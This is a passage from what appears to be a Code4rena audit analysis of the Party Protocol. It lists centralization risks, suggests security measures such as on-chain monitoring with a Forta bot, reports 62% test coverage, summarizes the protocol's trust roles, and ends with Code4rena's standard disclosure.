- Centralized Development: If development and decision-making are centralized in a small group, there is a risk that decisions may not adequately reflect the needs of the community.

- Token Concentration: If a small group of participants holds a significant amount of tokens, they could have a disproportionate influence on decision-making and governance.

- Power Concentration in Gatekeepers: If gatekeeping functions are centralized, the power to allow or restrict participation could be misused.

## 6. Security Approach of the Project

What the project can add in the understanding of Security:

- By distributing the project to testnets, ensuring that the audits are carried out in onchain audit. 
- Pause Mechanism - This is a chaotic situation, which can be thought of as a choice between decentralization and security.
- Add On-Chain Monitoring System - If on-chain monitoring systems such as Forta are added to the project, its security will increase.

For example, [this bot](https://app.forta.network/bot/0x7f9afc392329ed5a473bcf304565adf9c2588ba4bc060f7d215519005b8303e3) tracks any DEFI transactions in which wrapping, unwrapping, swapping, depositing, or withdrawals occur over a threshold amount. If transactions occur with unusually high token amounts, the bot sends out an alert. 

After the Code4rena audit is completed and the project is live, I recommend the audit process to continue.

## 7. Test analysis

The audit scope of the contracts to be reviewed is 62%, with the aim of reaching 100% to increase the safety. 

## 8. Conclusion 

The Party Protocol is designed to streamline group coordination on the blockchain, fostering the creation of groups, facilitating decision-making processes, and ensuring efficient resource distribution. Notably, it refrains from engaging with ERC20 tokens employing rebase or transfer fees. Instead, it seamlessly integrates with a diverse array of ERC721 tokens possessing liquidity and listings on platforms, such as OpenSea.

This protocol is set to launch on both the Ethereum Mainnet and Base Mainnet, embodying two pivotal roles of trust: Hosts, endowed with the authority to veto proposals and configure `Rage Quit`` and Authorities, possessing root access for managing sensitive operations.

Emphasizing security measures against denial-of-service attacks, the protocol anticipates strict adherence to multiple Ethereum Improvement Proposals. This commitment ensures harmonious interoperability with other projects within the Ethereum network, enhancing overall compatibility.

### Time spent

15 hours

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
